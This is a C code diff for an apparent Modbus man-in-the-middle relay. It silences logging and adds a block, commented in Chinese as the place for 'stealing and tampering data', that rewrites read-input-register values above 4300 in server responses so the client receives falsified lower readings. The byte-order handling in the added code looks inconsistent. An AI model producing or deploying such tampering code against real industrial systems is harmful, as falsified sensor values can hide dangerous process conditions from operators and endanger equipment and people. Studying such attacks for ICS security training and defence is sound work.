@@ -161,7 +161,7 @@ int modbus_monitor_start(void * sub_proc,void * para)
                         continue;
                     }
                     connector_setstate(channel_conn, CONN_CHANNEL_ACCEPT);
-                    printf("create a new channel %p!\n", channel_conn);
+                    //printf("create a new channel %p!\n", channel_conn);
 
                     conn_hub->hub_ops->add_connector(conn_hub, channel_conn, NULL);
 		            // should add a start message
@@ -180,7 +180,7 @@ int modbus_monitor_start(void * sub_proc,void * para)
                 else if (connector_get_type(recv_conn) == CONN_CHANNEL)
                 {
                     // client side send transfer data to server 
-                    printf("conn peeraddr %s send message\n", recv_conn->conn_peeraddr);
+                    //printf("conn peeraddr %s send message\n", recv_conn->conn_peeraddr);
                     rc = 0;
                     // receive modbus data
                     len = recv_conn->conn_ops->read(recv_conn, Buf,256);
@@ -196,18 +196,17 @@ int modbus_monitor_start(void * sub_proc,void * para)
                         // print modbus data
                             printf(" get modbus data %d bytes from client!\n",len);
                             print_bin_data(Buf,len,16);
+
                         // send modbus data
-                            printf(" modbus head is %d!\n",*(UINT16 *)Buf);
 	                        ret=client_conn->conn_ops->write(client_conn,Buf,len);
-                            printf(" send  modbus  data %d bytes to server!\n",ret);
-                            //printf(" iec104 T value %d I value %d!\n",(*(UINT16 *)(Buf+15)),(*(UINT16 *)(Buf+20)));
+                           // printf(" send  modbus  data %d bytes to server!\n",ret);
 
                     }
                 }
                 else if (connector_get_type(recv_conn) == CONN_CLIENT)
                 {
                     // server side send transfer data to client 
-                    printf("conn peeraddr %s send message\n", recv_conn->conn_peeraddr);
+                   // printf("conn peeraddr %s send message\n", recv_conn->conn_peeraddr);
                     rc = 0;
                     // receive iec104 data
                     len = recv_conn->conn_ops->read(recv_conn, Buf,256);
@@ -220,12 +219,27 @@ int modbus_monitor_start(void * sub_proc,void * para)
                         // print modbus data
                             printf(" get modbus data %d bytes from server!\n",len);
                             print_bin_data(Buf,len,16);
+			// 窃取数据和篡改数据的位置开始
+			
+			  if(Buf[7] == 0x04) // read input register
+			  {
+				UINT16  value;
+				value = Buf[10]*256+Buf[9];
+				if(value >4300)
+				{
+			  	      value = 4100 + value%200;
+				      Memcpy(Buf+9,&value,sizeof(value));	
+				}	
+                          }   
 
-                            printf(" modbus head value is %d!\n",Buf[0]*128+Buf[1]);
+			//窃取数据和篡改数据的位置结束
+
+
+                            //printf(" modbus head value is %d!\n",Buf[0]*128+Buf[1]);
 
                         // send modbus data
 	                        ret=client_conn->conn_ops->write(channel_conn,Buf,len);
-                            printf(" send  modbus data %d bytes to client!\n",ret);
+                          //  printf(" send  modbus data %d bytes to client!\n",ret);
 
                     }
                 }
